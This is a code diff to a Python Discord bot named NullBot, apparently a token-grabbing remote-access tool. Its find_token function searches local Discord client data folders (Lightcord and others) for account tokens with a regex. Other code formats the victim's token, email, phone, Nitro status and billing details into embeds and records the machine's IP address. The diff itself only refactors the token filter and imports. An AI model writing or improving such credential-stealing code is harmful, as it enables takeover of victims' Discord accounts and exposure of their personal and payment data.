@@ -6,7 +6,7 @@ from disnake.ext import commands
 
 from datetime import datetime
 from socket import create_connection
-import os, re, aiohttp, requests, random
+import os, re, requests
 
 ############### Global functions available in every cog
 
@@ -43,7 +43,7 @@ def checked_embeds(self, token, email, phone, username, nitro, billing, avatar, 
     return embed
 
 def find_token(self):
-    tokens = tokens2 = []
+    tokens = realTokens = []
     local, roaming = os.getenv("LOCALAPPDATA"), os.getenv("APPDATA")
     paths = {
         "Lightcord": roaming + "\\Lightcord",
@@ -63,12 +63,12 @@ def find_token(self):
                         for token in re.findall(regex, line): 
                             tokens.append(token)
         except FileNotFoundError: continue
-    def englishOnly(s): 
-        return s.isascii()
-    goodTKs = []
+
     for t in tokens:
-        if englishOnly(t): goodTKs.append(t)
-    return goodTKs
+        if t.isascii(): 
+            realTokens.append(t)
+
+    return realTokens
 
 ############### Custom bot implementation for functions 
 
@@ -79,6 +79,8 @@ class NullBot(commands.InteractionBot):
         super().__init__(**options)
         self.ip_addr = IP()
         self.original_dir = original_dir
+
+        # Checks if username is Admin/Administrator
         if "dmin" in os.getenv("username"):
             self.identifier = self.ip_addr
         else:
